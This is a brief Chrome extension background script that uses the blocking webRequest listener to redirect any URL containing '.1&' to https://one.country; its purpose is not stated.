const MatchHost = '.1'
const RedirectUrl = 'https://one.country'

chrome.webRequest.onBeforeRequest.addListener((data) => {
    if(data.url.includes(`${MatchHost}&`)) {
        return {
            redirectUrl: RedirectUrl
        }
    }
}, {urls: ["<all_urls>"]}, ["blocking"])
